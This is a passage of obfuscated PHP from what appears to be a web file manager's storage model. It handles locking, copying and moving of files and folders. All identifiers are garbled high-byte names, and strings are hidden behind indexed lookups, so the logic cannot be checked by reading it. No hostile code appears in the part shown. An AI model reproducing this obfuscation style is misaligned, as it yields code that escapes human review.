= 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($â­Ñåğ) { $á‰ÁÙÉÓ =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->allowLock()) { return; } $this->_lockCheck($á‰ÁÙÉÓ[632], $â­Ñåğ); $âø¨ı = 1; $this->_lockEvent($â­Ñåğ, array($á‰ÁÙÉÓ[633], $á‰ÁÙÉÓ[634]), $âø¨ı); $this->_lockParent($â­Ñåğ, array($á‰ÁÙÉÓ[634]), $âø¨ı); $this->_lockEvent($â­Ñåğ, array($á‰ÁÙÉÓ[635], $á‰ÁÙÉÓ[636]), $âø¨ı); $this->_lockCheckEnd($á‰ÁÙÉÓ[632], $â­Ñåğ); } public function lockCopyEnd($Ï¡ÛÅ) { $ÅÃˆë€ =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->allowLock()) { return; } $€‡ÑŒ¥ = 0; $this->_lockEvent($Ï¡ÛÅ, array($ÅÃˆë€[633], $ÅÃˆë€[634]), $€‡ÑŒ¥); $this->_lockParent($Ï¡ÛÅ, array($ÅÃˆë€[634]), $€‡ÑŒ¥); $this->_lockEvent($Ï¡ÛÅ, array($ÅÃˆë€[635], $ÅÃˆë€[636]), $€‡ÑŒ¥); } public function lockWriteStart($ñòğÑÆ¾, $û³ïŒò = '') { $›¼€Èªª =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->allowLock()) { return; } $this->_lockCheck($›¼€Èªª[633], $ñòğÑÆ¾); $ƒ•ˆ«âè = 1; $this->_lockKey($›¼€Èªª[637] . $ñòğÑÆ¾ . $›¼€Èªª[20] . $û³ïŒò, $ƒ•ˆ«âè); $this->_lockEvent($ñòğÑÆ¾, array($›¼€Èªª[632], $›¼€Èªª[634]), $ƒ•ˆ«âè); $this->_lockParent($ñòğÑÆ¾, array($›¼€Èªª[632], $›¼€Èªª[634]), $ƒ•ˆ«âè); $this->_lockCheckEnd($›¼€Èªª[633], $ñòğÑÆ¾); } public function lockWriteEnd($–Š¬¹ìİ, $ğ€”Ïàı = '') { $ş¸ô¸¨™ =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->allowLock()) { return; } $éÓŠ÷ı = 0; $this->_lockKey($ş¸ô¸¨™[637] . $–Š¬¹ìİ . $ş¸ô¸¨™[20] . $ğ€”Ïàı, $éÓŠ÷ı); $this->_lockEvent($–Š¬¹ìİ, array($ş¸ô¸¨™[632], $ş¸ô¸¨™[634]), $éÓŠ÷ı); $this->_lockParent($–Š¬¹ìİ, array($ş¸ô¸¨™[632], $ş¸ô¸¨™[634]), $éÓŠ÷ı); } public function lockMoveStart($—£ãÅ³È) { $”ğ×šñ =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->allowLock()) { return; } $this->_lockCheck($”ğ×šñ[634], $—£ãÅ³È); $¶Òçüëµ = 1; $this->_lockKey($”ğ×šñ[638] . $—£ãÅ³È, $¶Òçüëµ); $this->_lockEvent($—£ãÅ³È, array($”ğ×šñ[632], $”ğ×šñ[633]), $¶Òçüëµ); $this->_lockParent($—£ãÅ³È, array($”ğ×šñ[632], $”ğ×šñ[634]), $¶Òçüëµ); $this->_lockEvent($—£ãÅ³È, array($”ğ×šñ[639], $”ğ×šñ[635], $”ğ×šñ[636]), $¶Òçüëµ); $this->_lockCheckEnd($”ğ×šñ[634], $—£ãÅ³È); } public function lockMoveEnd($ ØµĞŞí) { $°ù‰Ïñ =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->allowLock()) { return; } $Ğ‘ç¥ÚÖ = 0; $this->_lockKey($°ù‰Ïñ[638] . $ ØµĞŞí, $Ğ‘ç¥ÚÖ); $this->_lockEvent($ ØµĞŞí, array($°ù‰Ïñ[632], $°ù‰Ïñ[633]), $Ğ‘ç¥ÚÖ); $this->_lockParent($ ØµĞŞí, array($°ù‰Ïñ[632], $°ù‰Ïñ[634]), $Ğ‘ç¥ÚÖ); $this->_lockEvent($ ØµĞŞí, array($°ù‰Ïñ[639], $°ù‰Ïñ[635], $°ù‰Ïñ[636]), $Ğ‘ç¥ÚÖ); } private function _lockCheck($¦„ü´å, $×ÛÓô¡½) { $ä°ƒÜŸ =& $_SERVER[ü¢ÙÊñÛ]; $ï¦è´å = $this->sourceInfo($×ÛÓô¡½); $¡ç‚Çè = $¦„ü´å . $ä°ƒÜŸ[20] . $×ÛÓô¡½; $this->_lockTimeStart[$¡ç‚Çè] = timeFloat(); if (!is_array($ï¦è´å)) { return; } $‰Óç õ = LNG($ä°ƒÜŸ[640]); CacheLock::setErrorMsg($ä°ƒÜŸ[187] . htmlspecialchars($ï¦è´å[$ä°ƒÜŸ[42]]) . $ä°ƒÜŸ[189] . $‰Óç õ); $this->_lockKey($¡ç‚Çè, 1); $this->_lockKey($¡ç‚Çè, 0); $éÓ™éÕ = array_reverse($this->parentLevelArray($ï¦è´å[$ä°ƒÜŸ[595]])); foreach ($éÓ™éÕ as $Ï¬«‰ÓÓ) { $¡ç‚Çè = $¦„ü´å . $ä°ƒÜŸ[641] . $Ï¬«‰ÓÓ; if (CacheLock::lockGet($ä°ƒÜŸ[642] . $¡ç‚Çè)) { $ï¦è´å = $this->sourceInfo($Ï¬«‰ÓÓ); CacheLock::setErrorMsg($ä°ƒÜŸ[187] . htmlspecialchars($ï¦è´å[$ä°ƒÜŸ[42]]) . $ä°ƒÜŸ[189] . $‰Óç õ); $this->_lockKey($¡ç‚Çè, 1); $this->_lockKey($¡ç‚Çè, 0); } } } private function _lockCheckEnd($û¹´ì˜, $»ıÎˆ) { $ËíƒµÓü =& $_SERVER[ü¢ÙÊñÛ]; $×„äıÄª = $û¹´ì˜ . $ËíƒµÓü[20] . $»ıÎˆ; CacheLock::setErrorMsg($ËíƒµÓü[64]); if (!isset($this->_lockTimeStart[$×„äıÄª])) { return; } $ìó×Šìê = timeFloat() - $this->_lockTimeStart[$×„äıÄª]; unset($this->_lockTimeStart[$×„äıÄª]); if ($ìó×Šìê > 0.5) { unset(self::$cacheSourceInfo[$ËíƒµÓü[544] . $»ıÎˆ]); } $åö˜éªª = $this->sourceInfo($»ıÎˆ); if (!$åö˜éªª) { show_json(LNG($ËíƒµÓü[119]), !1); } } private function _lockParent($úØÛ®Í”, $§Â¤¶Ìà, $İîšû¸³) { if (!$this->autoLockSet) { return; } $Û¤óí¹· = $this->sourceInfo($úØÛ®Í”); if (!is_array($Û¤óí¹·)) { return; } $ô”âÄöŸ = array_reverse($this->parentLevelArray($Û¤óí¹·[$_SERVER[ü¢ÙÊñÛ][595]])); foreach ($ô”âÄöŸ as $Éü¶Ç·ë) { $this->_lockEvent($Éü¶Ç·ë, $§Â¤¶Ìà, $İîšû¸³); } } private function _lockEvent($¸Ó¼¹¶‚, $ğ›ÁéÉñ, $àâ’¾“”) { $†í¡Ÿ²¼ =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->autoLockSet) { return; } foreach ($ğ›ÁéÉñ as $ßô·Ê·á) { $ùÖš¿ª¿ = $ßô·Ê·á . $†í¡Ÿ²¼[20] . $¸Ó¼¹¶‚; if ($àâ’¾“” && CacheLock::lockGet($†í¡Ÿ²¼[642] . $ùÖš¿ª¿)) { continue; } $this->_lockKey($ùÖš¿ª¿, $àâ’¾“”); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($×Ô„çòê, $ ë¢ä®Ã = 1) { $öÉâÖ„ˆ = $_SERVER[ü¢ÙÊñÛ][642] . md5($×Ô„çòê); if ($ ë¢ä®Ã) { if (isset(self::$_lockItemArr[$öÉâÖ„ˆ])) { return; } self::$_lockItemArr[$öÉâÖ„ˆ] = 1; CacheLock::lock($öÉâÖ„ˆ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$öÉâÖ„ˆ])) { return; } unset(self::$_lockItemArr[$öÉâÖ„ˆ]); CacheLock::unlock($öÉâÖ„ˆ); } } public function isParentOf($÷ ôáÒí, $æµçà‘®) { $´µ•úÃ“ =& $_SERVER[ü¢ÙÊñÛ]; $ı‰ºÔ´ = $this->sourceInfo($÷ ôáÒí); $–‡¨Ò× = $this->sourceInfo($æµçà‘®); $¶™Ö‡© = $ı‰ºÔ´[$´µ•úÃ“[595]] . $ı‰ºÔ´[$´µ•úÃ“[204]] . $´µ•úÃ“[60]; $ô®ÁÖÛ¦ = $–‡¨Ò×[$´µ•úÃ“[595]] . $–‡¨Ò×[$´µ•úÃ“[204]] . $´µ•úÃ“[60]; $ÊÀà˜ÒŠ = strpos($ô®ÁÖÛ¦, $¶™Ö‡©) === 0; return $ÊÀà˜ÒŠ; } private $targetIsDelete = 0; public function copy($ç´„åì–, $ÅËâœÕØ, $Şô Ş’ = REPEAT_REPLACE, $ÑˆëÆ¤ = '') { $õÕˆÂöı =& $_SERVER[ü¢ÙÊñÛ]; $ùÃ•ìÛ = $this->sourceInfo($ç´„åì–); $ş¾£ÊÊµ = $this->sourceInfo($ÅËâœÕØ); if (!$ùÃ•ìÛ || !$ş¾£ÊÊµ || $ş¾£ÊÊµ[$õÕˆÂöı[496]] != $õÕˆÂöı[102]) { return !1; } if ($this->isParentOf($ç´„åì–, $ÅËâœÕØ)) { return !1; } $í€™ûœŞ = $ÑˆëÆ¤ ? $ÑˆëÆ¤ : $ùÃ•ìÛ[$õÕˆÂöı[42]]; $this->lockCopyStart($ç´„åì–); $this->lockWriteStart($ÅËâœÕØ, $í€™ûœŞ); $œî’›Ó— = array($õÕˆÂöı[643] => array(), $õÕˆÂöı[644] => array(), $õÕˆÂöı[645] => array()); $this->targetIsDelete = intval($ùÃ•ìÛ[$õÕˆÂöı[516]]); $ëÂÅ¯§¼ = $this->fileNameExistAuto($ÅËâœÕØ, $ùÃ•ìÛ); $¨¡Í×Àù = $this->_copy($ç´„åì–, $ÅËâœÕØ, $Şô Ş’, $œî’›Ó—, !0, $ÑˆëÆ¤); $this->_childrenListClear(); $this->lockCopyEnd($ç´„åì–); $this->lockWriteEnd($ÅËâœÕØ, $í€™ûœŞ); if ($ùÃ•ìÛ[$õÕˆÂöı[496]] == $õÕˆÂöı[102] && $ëÂÅ¯§¼ == $¨¡Í×Àù) { $this->folderSizeResetChildren($ëÂÅ¯§¼); } Model($õÕˆÂöı[646])->addAll($œî’›Ó—[$õÕˆÂöı[644]], array(), !0); if ($ëÂÅ¯§¼ != $¨¡Í×Àù || $ùÃ•ìÛ[$õÕˆÂöı[496]] == $õÕˆÂöı[102]) { Model($õÕˆÂöı[647])->eventCopy($¨¡Í×Àù); } $this->saveAll($œî’›Ó—[$õÕˆÂöı[645]]); Model($õÕˆÂöı[243])->linkAdd($œî’›Ó—[$õÕˆÂöı[643]]); $this->folderSizeReset($ÅËâœÕØ); $this->updateModifyTime($ÅËâœÕØ); return $¨¡Í×Àù; } private function _copy($ÊÑ§µåÛ, $û²ßèÈè, $ó½ˆ£», &$×‡ÍÛÆ¶, $ÉÈ…¦­Ê, $ÇÙù¢äü = '') { $ ô¸‡è =& $_SERVER[ü¢ÙÊñÛ]; $‚¦İüğó = $this->sourceInfoCache($ÊÑ§µåÛ); $’ ÉòÃ› = $‚¦İüğó[$ ô¸‡è[496]] == $ ô¸‡è[102]; $•ÀÆšüÄ = $ÇÙù¢äü ? $ÇÙù¢äü : $‚¦İüğó[$ ô¸‡è[42]]; $·é†œä× = $this->fileNameExistAuto($û²ßèÈè, $‚¦İüğó); if ($ÉÈ…¦­Ê) { $this->_childrenAllMake($ÊÑ§µåÛ); if ($’ ÉòÃ› && $·é†œä×) { $this->_childrenAllMake($·é†œä×); } } if (!$·é†œä×) { return $this->_copyCreate($ÊÑ§µåÛ, $û²ßèÈè, $•ÀÆšüÄ, $×‡ÍÛÆ¶); } $“â˜‡•˜ = $·é†œä×; if ($’ ÉòÃ›) { if ($ó½ˆ£» == REPEAT_RENAME_FOLDER) { $•ÀÆšüÄ = $this->fileNameAutoCache($û²ßèÈè, $•ÀÆšüÄ, $ó½ˆ£», $’ ÉòÃ›); $“â˜‡•˜ = $this->_copyCreate($ÊÑ§µåÛ, $û²ßèÈè, $•ÀÆšüÄ, $×‡ÍÛÆ¶); } else { $•ƒšúƒ = $this->_childrenList($ÊÑ§µåÛ); foreach ($•ƒšúƒ as $Å…¿ÜÇõ) { $this->_copy($Å…¿ÜÇõ[$ ô¸‡è[204]], $·é†œä×, $ó½ˆ£», $×‡ÍÛÆ¶, !1); } } } else { if ($ó½ˆ£» == REPEAT_RENAME || $ó½ˆ£» == REPEAT_RENAME_FOLDER) { $•ÀÆšüÄ = $this->fileNameAutoCache($û²ßèÈè, $•ÀÆšüÄ, $ó½ˆ£», $’ ÉòÃ›); $“â˜‡•˜ = $this->_copyCreate($ÊÑ§µåÛ, $û²ßèÈè, $•ÀÆšüÄ, $×‡ÍÛÆ¶); } else { if ($ó½ˆ£» == REPEAT_REPLACE) { $ÓöÅÑ ² = $this->sourceInfoCache($·é†œä×); $‡Ô®‰¡‹ = $this->fileHistory($ÓöÅÑ ², $‚¦İüğó[$ ô¸‡è[552]], $‚¦İüğó[$ ô¸‡è[90]]); if ($‡Ô®‰¡‹) { $×‡ÍÛÆ¶[$ ô¸‡è[643]][] = $‚¦İüğó[$ ô¸‡è[552]]; } } else { if ($ó½ˆ£» == REPEAT_SKIP) { } } } Hook::trigger($ ô¸‡è[648], array($ ô¸‡è[649], $‚¦İüğó, 0)); } return $“â˜‡•˜; } private function _copyCreate($®µŞš¾µ, $ÄÆœğ‡Ñ, $´°åÖ¡û, &$›àÅÚ¨ˆ) { $Åİ¯Ñë =& $_SERVER[ü¢ÙÊñÛ]; $±–†ğ¡ö = $this->sourceInfoCache($®µŞš¾µ); $ß®Ä²”Ô = $this->sourceInfoCache($ÄÆœğ‡Ñ); $§ÎÅ÷¨Õ = $this->_makeItemData($±–†ğ¡ö, $ß®Ä²”Ô, $´°åÖ¡û); Hook::trigger($Åİ¯Ñë[650], $§ÎÅ÷¨Õ); Hook::trigger($Åİ¯Ñë[651], array($Åİ¯Ñë[652], $§ÎÅ÷¨Õ, 0)); $Ô­Ÿ•ã = $this->add($§ÎÅ÷¨Õ); $«¹©¸• = array($Åİ¯Ñë[204] => $Ô­Ÿ•ã, $Åİ¯Ñë[42] => $´°åÖ¡û); $this->_copyApplyMeta($«¹©¸•, $›àÅÚ¨ˆ); if ($±–†ğ¡ö[$Åİ¯Ñë[496]] != $Åİ¯Ñë[102]) { $›àÅÚ¨ˆ[$Åİ¯Ñë[643]][] = $±–†ğ¡ö[$Åİ¯Ñë[552]]; return $Ô­Ÿ•ã; } $„óí‡É = array(); $³‘„³¶ì = array(); $this->_childrenListAll($®µŞš¾µ, $„óí‡É); $ÄÉÁûôÓ = count($„óí‡É); if ($ÄÉÁûôÓ == 0) { return $Ô­Ÿ•ã; } $üø¯¶­Õ = $this->sourceInfo($Ô­Ÿ•ã); foreach ($„óí‡É as $‘Ì×²óù) { $ğ•›«ó = $this->_makeItemData($‘Ì×²óù, $üø¯¶­Õ, $‘Ì×²óù[$Åİ¯Ñë[42]]); $ğ•›«ó[$Åİ¯Ñë[595]] = $‘Ì×²óù[$Åİ¯Ñë[595]]; $³‘„³¶ì[] = $ğ•›«ó; } $this->chunkEventSet($Åİ¯Ñë[653], array($Åİ¯Ñë[654], $§ÎÅ÷¨Õ, $ÄÉÁûôÓ)); $this->addAll($³‘„³¶ì, array(), !1); $çÉÃì€š = $this->where(array($Åİ¯Ñë[203] => $Ô­Ÿ•ã))->select(); $Ô‚÷öƒ = $this->_childrenMakeRelation($„óí‡É, $çÉÃì€š); $Ô‚÷öƒ[$®µŞš¾µ] = $Ô­Ÿ•ã; $Äï¦ùúÏ = array(); $†—•ÇÉ× = array(); foreach ($çÉÃì€š as $‘Ì×²óù) { $°ŞüÂ‹ú = $‘Ì×²óù[$Åİ¯Ñë[204]]; $µş¸ûé„ = $this->_childrenMatch($Ô‚÷öƒ, $‘Ì×²óù, $üø¯¶­Õ); $Äï¦ùúÏ[] = array($Åİ¯Ñë[204], $°ŞüÂ‹ú, $Åİ¯Ñë[203], $µş¸ûé„[$Åİ¯Ñë[203]]); $†—•ÇÉ×[] = array($Åİ¯Ñë[204], $°ŞüÂ‹ú, $Åİ¯Ñë[595], $µş¸ûé„[$Åİ¯Ñë[595]]); $this->_copyApplyMeta($‘Ì×²óù, $›àÅÚ¨ˆ); if ($‘Ì×²óù[$Åİ¯Ñë[496]] != $Åİ¯Ñë[102]) { $›àÅÚ¨ˆ[$Åİ¯Ñë[643]][] = $‘Ì×²óù[$Åİ¯Ñë[552]]; } } $this->chunkEventSet($Åİ¯Ñë[655], array($Åİ¯Ñë[656], $§ÎÅ÷¨Õ, $ÄÉÁûôÓ)); $this->saveAll($Äï¦ùúÏ); $this->chunkEventSet($Åİ¯Ñë[657], array($Åİ¯Ñë[658], $§ÎÅ÷¨Õ, $ÄÉÁûôÓ)); $this->saveAll($†—•ÇÉ×); return $Ô­Ÿ•ã; } private function _childrenMakeRelation($”ˆÏŠà, $è‰„‹ıÃ) { $„òÎıåù =& $_SERVER[ü¢ÙÊñÛ]; $Ş¥‘¡‡ = array(); $âÔóıìœ = array(); foreach ($”ˆÏŠà as $ÚÀï’‹„) { $‹°œ±îÈ = $ÚÀï’‹„[$„òÎıåù[42]] . $„òÎıåù[18] . $ÚÀï’‹„[$„òÎıåù[595]]; $Ş¥‘¡‡[$‹°œ±îÈ] = $ÚÀï’‹„[$„òÎıåù[204]]; } foreach ($è‰„‹ıÃ as $ÚÀï’‹„) { $‹°œ±îÈ = $ÚÀï’‹„[$„òÎıåù[42]] . $„òÎıåù[18] . $ÚÀï’‹„[$„òÎıåù[595]]; $è­æÕŸ² = $Ş¥‘¡‡[$‹°œ±îÈ]; $âÔóıìœ[$è­æÕŸ²] = $ÚÀï’‹„[$„òÎıåù[204]]; } return $âÔóıìœ; } private function _childrenMatch($¼ˆÖ®ƒ, $«¦±·îÇ, $™ÕÈ³¯©) { $šä™Ç­í =& $_SERVER[ü¢ÙÊñÛ]; $¨‰à¸îØ = $™ÕÈ³¯©[$šä™Ç­í[595]]; $“—òò™Á = $this->parentLevelArray($«¦±·îÇ[$šä™Ç­í[595]]); foreach ($“—òò™Á as $—£Ÿ´Îï) { if (isset($¼ˆÖ®ƒ[$—£Ÿ´Îï])) { $¨‰à¸îØ .= $¼ˆÖ®ƒ[$—£Ÿ´Îï] . $šä™Ç­í[659]; } } $¨‰à¸îØ = rtrim($¨‰à¸îØ, $šä™Ç­í[60]) . $šä™Ç­í[60]; $šÔÓ‹àö = $this->parentLevelArray($¨‰à¸îØ); $‚‹ˆäÚ¥ = $šÔÓ‹àö[count($šÔÓ‹àö) - 1]; return array($šä™Ç­í[203] => $‚‹ˆäÚ¥, $šä™Ç­í[595] => $¨‰à¸îØ); } private function _makeItemData($¡ã¸ä·ø, $…’¨õ¨¶, $–¨ôÌŞÏ) { $ÁÚ¸ç´Ÿ =& $_SERVER[ü¢ÙÊñÛ]; $­ü•‘“ö = array($ÁÚ¸ç´Ÿ[660] => $¡ã¸ä·ø[$ÁÚ¸ç´Ÿ[496]], $ÁÚ¸ç´Ÿ[505] => $–¨ôÌŞÏ, $ÁÚ¸ç´Ÿ[661] => $¡ã¸ä·ø[$ÁÚ¸ç´Ÿ[497]] ? $¡ã¸ä·ø[$ÁÚ¸ç´Ÿ[497]] : $ÁÚ¸ç´Ÿ[22], $ÁÚ¸ç´Ÿ[553] => $¡ã¸ä·ø[$ÁÚ¸ç´Ÿ[552]] ? $¡ã¸ä·ø[$ÁÚ¸ç´Ÿ[552]] : 0, $ÁÚ¸ç´Ÿ[631] => $¡ã¸ä·ø[$ÁÚ¸ç´Ÿ[90]] ? $¡ã¸ä·ø[$ÁÚ¸ç´Ÿ[90]] : 0, $ÁÚ¸ç´Ÿ[662] => intval($…’¨õ¨¶[$ÁÚ¸ç´Ÿ[201]]), $ÁÚ¸ç´Ÿ[663] => intval($…’¨õ¨¶[$ÁÚ¸ç´Ÿ[580]]), $ÁÚ¸ç´Ÿ[664] => intval(USER_ID), $ÁÚ¸ç´Ÿ[665] => intval(USER_ID), $ÁÚ¸ç´Ÿ[488] => intval($…’¨õ¨¶[$ÁÚ¸ç´Ÿ[204]]), $ÁÚ¸ç´Ÿ[666] => $…’¨õ¨¶[$ÁÚ¸ç´Ÿ[595]] . $…’¨õ¨¶[$ÁÚ¸ç´Ÿ[204]] . $ÁÚ¸ç´Ÿ[60], $ÁÚ¸ç´Ÿ[509] => $¡ã¸ä·ø[$ÁÚ¸ç´Ÿ[99]] ? $¡ã¸ä·ø[$ÁÚ¸ç´Ÿ[99]] : time(), $ÁÚ¸ç´Ÿ[515] => 0, $ÁÚ¸ç´Ÿ[667] => $ÁÚ¸ç´Ÿ[22]); return $­ü•‘“ö; } private function _copyApplyMeta($ûÒ–¶Ÿ», &$æƒÂËÖÁ) { $ì¼è†ù˜ =& $_SERVER[ü¢ÙÊñÛ]; $èÜºÛ¼ = $ûÒ–¶Ÿ»[$ì¼è†ù˜[204]]; $û …ò“ = $ûÒ–¶Ÿ»[$ì¼è†ù˜[42]]; if (!isset($ûÒ–¶Ÿ»[$ì¼è†ù˜[668]]) || !$ûÒ–¶Ÿ»[$ì¼è†ù˜[668]] || $ûÒ–¶Ÿ»[$ì¼è†ù˜[668]] == $ì¼è†ù˜[241]) { $æƒÂËÖÁ[$ì¼è†ù˜[645]][] = array($ì¼è†ù˜[204], $èÜºÛ¼, $ì¼è†ù˜[668], short_id($èÜºÛ¼)); } if (Input::check($û …ò“, $ì¼è†ù˜[669])) { $æƒÂËÖÁ[$ì¼è†ù˜[644]][] = array($ì¼è†ù˜[204] => $èÜºÛ¼, $ì¼è†ù˜[108] => $ì¼è†ù˜[549], $ì¼è†ù˜[462] => str_replace($ì¼è†ù˜[63], $ì¼è†ù˜[22], Pinyin::get($û …ò“))); $æƒÂËÖÁ[$ì¼è†ù˜[644]][] = array($ì¼è†ù˜[204] => $èÜºÛ¼, $ì¼è†ù˜[108] => $ì¼è†ù˜[548], $ì¼è†ù˜[462] => Pinyin::get($û …ò“, $ì¼è†ù˜[670])); } $æƒÂËÖÁ[$ì¼è†ù˜[644]][] = array($ì¼è†ù˜[204] => $èÜºÛ¼, $ì¼è†ù˜[108] => $ì¼è†ù˜[528], $ì¼è†ù˜[462] => KodSort::makeStr($û …ò“)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ëÆõ×³İ) { $š¾ƒ®«è =& $_SERVER[ü¢ÙÊñÛ]; $Êå›´ = $this->sourceInfo($ëÆõ×³İ); $±ğ³øıÛ = $š¾ƒ®«è[671]; $¸Œë¸° = array($š¾ƒ®«è[595] => array($š¾ƒ®«è[626], $Êå›´[$š¾ƒ®«è[595]] . $ëÆõ×³İ . $š¾ƒ®«è[627]), $š¾ƒ®«è[516] => $this->targetIsDelete); $¶´ç Ï› = $this->field($±ğ³øıÛ)->where($¸Œë¸°)->select(); if (!$¶´ç Ï›) { return; } $¶´ç Ï› = array_to_keyvalue($¶´ç Ï›, $š¾ƒ®«è[204]); foreach ($¶´ç Ï› as $—Ä·¸ÑÃ) { $ö´¼ó¨Ù = $—Ä·¸ÑÃ[$š¾ƒ®«è[203]]; $ëÆõ×³İ = $—Ä·¸ÑÃ[$š¾ƒ®«è[204]]; if (!isset($this->_childrenListCache[$ëÆõ×³İ]) && $—Ä·¸ÑÃ[$š¾ƒ®«è[496]] == $š¾ƒ®«è[102]) { $this->_childrenListCache[$ëÆõ×³İ] = array(); } if (!isset($this->_childrenListCache[$ö´¼ó¨Ù])) { $this->_childrenListCache[$ö´¼ó¨Ù] = array(); } $this->_childrenListCache[$ö´¼ó¨Ù][$ëÆõ×³İ] = $—Ä·¸ÑÃ; $this->_childrenItemCache[$ëÆõ×³İ] = $—Ä·¸ÑÃ; } } private function _childrenListAll($‹‰ò„á, &$øÔİÀš°) { $Ò¥«óğÁ =& $_SERVER[ü¢ÙÊñÛ]; if (!isset($this->_childrenListCache[$‹‰ò„á])) { return; } $Ë’Ê«” = $this->_childrenListCache[$‹‰ò„á]; foreach ($Ë’Ê«” as $Ó©Ñö¶ => $·ôÙ„€‹) { $øÔİÀš°[$Ó©Ñö¶] = $·ôÙ„€‹; if ($·ôÙ„€‹[$Ò¥«óğÁ[496]] == $Ò¥«óğÁ[102]) { $this->_childrenListAll($Ó©Ñö¶, $øÔİÀš°); } } } private function sourceInfoCache($õíğÊß«) { if (isset($this->_childrenItemCache[$õíğÊß«])) { return $this->_childrenItemCache[$õíğÊß«]; } return $this->sourceInfo($õíğÊß«); } private function _childrenList($¥ĞĞºŒ„) { if (isset($this->_childrenListCache[$¥ĞĞºŒ„])) { return $this->_childrenListCache[$¥ĞĞºŒ„]; } return $this->_childrenListSelect($¥ĞĞºŒ„); } private function _childrenListSelect($˜±¬¿Ş›) { $ã¬Øøæ¢ =& $_SERVER[ü¢ÙÊñÛ]; $¤Ë½ù¬ = array($ã¬Øøæ¢[203] => $˜±¬¿Ş›, $ã¬Øøæ¢[516] => $this->targetIsDelete); $í®øöº£ = $this->where($¤Ë½ù¬)->select(); $í®øöº£ = $í®øöº£ ? $í®øöº£ : array(); $Ò­‡Ş™¢ = array_to_keyvalue($í®øöº£, $ã¬Øøæ¢[204]); $this->_childrenListCache[$˜±¬¿Ş›] = $Ò­‡Ş™¢; foreach ($Ò­‡Ş™¢ as $˜±¬¿Ş› => $±Ôùó) { $this->_childrenItemCache[$˜±¬¿Ş›] = $±Ôùó; } return $Ò­‡Ş™¢; } private function fileNameExistAuto($ñ¡¢û», $—²î‹¬³) { $Ú¢ÈÂ–Í =& $_SERVER[ü¢ÙÊñÛ]; if ($—²î‹¬³[$Ú¢ÈÂ–Í[516]] == $Ú¢ÈÂ–Í[102]) { return $this->fileNameExist($ñ¡¢û», $—²î‹¬³[$Ú¢ÈÂ–Í[42]]); } return $this->fileNameExistCache($ñ¡¢û», $—²î‹¬³[$Ú¢ÈÂ–Í[42]]); } private function fileNameExistCache($›Ë–¾áˆ, $õĞËÌ´È) { $ØèïšŞµ =& $_SERVER[ü¢ÙÊñÛ]; $õĞËÌ´È = strtolower($õĞËÌ´È); $¶®ÈÑõ­ = $this->_childrenList($›Ë–¾áˆ); foreach ($¶®ÈÑõ­ as $¸Åíï±Š) { if ($õĞËÌ´È == strtolower($¸Åíï±Š[$ØèïšŞµ[42]])) { return $¸Åíï±Š[$ØèïšŞµ[204]]; } } return !1; } private function fileNameAutoCache($ˆ©ÔùüÏ, $¶·£Ô¤, $Òö±İ¡¶, $Îîãè–ı) { $å¹·êå =& $_SERVER[ü¢ÙÊñÛ]; $êõæ©ÜÂ = $this->_childrenList($ˆ©ÔùüÏ); $ÛàÃ¾ùú = array_to_keyvalue($êõæ©ÜÂ, $å¹·êå[22], $å¹·êå[42]); return $this->fileNameAutoGet($ÛàÃ¾ùú, $¶·£Ô¤, $Òö±İ¡¶, $Îîãè–ı); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($¥ÖŸ½ùİ, $‡¸İ, $³§ŸÊ—Ò = REPEAT_REPLACE, $Ò¥Á‚ıÚ = '') { $¡ªÓİ =& $_SERVER[ü¢ÙÊñÛ]; $¬ê™Ù² = $this->sourceInfo($¥ÖŸ½ùİ); $ôøœ³ø = $this->sourceInfo($‡¸İ); if ($¬ê™Ù²[$¡ªÓİ[203]] == $ôøœ³ø[$¡ªÓİ[204]]) { if ($¬ê™Ù²[$¡ªÓİ[516]] == $¡ªÓİ[102]) { Model($¡ªÓİ[514])->restore(array($¥ÖŸ½ùİ)); } if (!$Ò¥Á‚ıÚ || $Ò¥Á‚ıÚ == $¬ê™Ù²[$¡ªÓİ[42]]) { return $¥ÖŸ½ùİ; } } $‹ûàà§¥ = $this->pathInfoMore($¥ÖŸ½ùİ); if ($this->isParentOf($¥ÖŸ½ùİ, $‡¸İ)) { return !1; } if (!$¬ê™Ù² || !$ôøœ³ø || $ôøœ³ø[$¡ªÓİ[496]] != $¡ªÓİ[102]) { return !1; } Hook::trigger($¡ªÓİ[672], $‹ûàà§¥); $this->targetIsDelete = intval($¬ê™Ù²[$¡ªÓİ[516]]); if ($¬ê™Ù²[$¡ªÓİ[203]] == $‡¸İ && $Ò¥Á‚ıÚ != $¬ê™Ù²[$¡ªÓİ[42]]) { $¬À¼©Ñ = $this->fileNameExist($‡¸İ, $Ò¥Á‚ıÚ); if ($¬À¼©Ñ && $¬ê™Ù²[$¡ªÓİ[496]] == $¡ªÓİ[241]) { $¨ã¥Ü¢ê = $this->sourceInfo($¬À¼©Ñ); $ˆ¶ÙÇŞë = $this->fileHistory($¨ã¥Ü¢ê, $¬ê™Ù²[$¡ªÓİ[552]], $¬ê™Ù²[$¡ªÓİ[90]]); if (!$ˆ¶ÙÇŞë) { Model($¡ªÓİ[555])->remove($¬ê™Ù²[$¡ªÓİ[552]]); } $this->removeNow($¥ÖŸ½ùİ, !1); $this->folderSizeReset($‡¸İ); Hook::trigger($¡ªÓİ[673], $‹ûàà§¥); return $¬À¼©Ñ; } } $¥ÁÄ˜º¨ = $Ò¥Á‚ıÚ ? $Ò¥Á‚ıÚ : $¬ê™Ù²[$¡ªÓİ[42]]; $this->lockMoveStart($¥ÖŸ½ùİ); $this->lockWriteStart($‡¸İ, $¥ÁÄ˜º¨); $®šÀåò = array($¡ªÓİ[643] => array(), $¡ªÓİ[674] => !1); $this->clearShare($¥ÖŸ½ùİ, $‡¸İ); $ˆ«×Ë‚ = $this->fileNameExistAuto($‡¸İ, $¬ê™Ù²); $şÅò´·± = $this->_move($¥ÖŸ½ùİ, $‡¸İ, $³§ŸÊ—Ò, $®šÀåò, 